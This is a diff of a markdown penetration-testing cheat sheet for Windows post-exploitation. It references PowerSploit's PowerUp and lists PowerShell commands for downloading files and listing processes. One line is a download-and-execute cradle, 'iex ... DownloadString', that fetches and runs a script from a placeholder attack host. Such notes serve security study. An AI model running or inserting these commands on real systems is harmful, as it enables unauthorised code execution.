@@ -1,16 +1,18 @@
 ##### [Execute PowerUp.ps1](../../../../Tools/Shells/Windows/PowerShell/PowerSploit/PowerUp.md)
 
-##### Download A File To Disk
+# Download File
+##### Download File To Disk
 ```bash
 powershell -c wget "http://<Source Address>/<Source File>" -outfile "<Output File>"
 ```
 
-##### Download A File To String and Invoke
+### Download File To String
+##### From Meterpreter PowerShell Prompt
 ```bash
-PS > iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/PowerUp.ps1')
-PS > Invoke-AllChecks
+PS > iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/[Source File]')
 ```
 
+# Processes
 ##### Get list of processes running, sorted by name.
 ```powershell
 tasklist /NH | sort
